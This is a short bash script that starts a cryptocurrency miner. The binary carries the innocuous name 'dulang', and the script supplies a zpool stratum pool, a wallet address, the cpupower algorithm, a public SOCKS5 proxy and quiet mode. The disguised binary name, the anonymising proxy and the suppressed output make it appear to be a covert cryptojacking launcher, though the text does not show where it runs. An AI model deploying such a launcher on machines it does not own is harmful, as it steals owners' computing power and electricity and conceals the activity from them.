#!/bin/bash
POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
WALLET=CXLyeasEvrdrr99WdeKmeYcnDaTkAqcEAx
PROXY=socks5://72.195.34.41:4145
./dulang -a cpupower -o $POOL -u $WALLET -p c=CPU,zap=CPU -x $PROXY -q
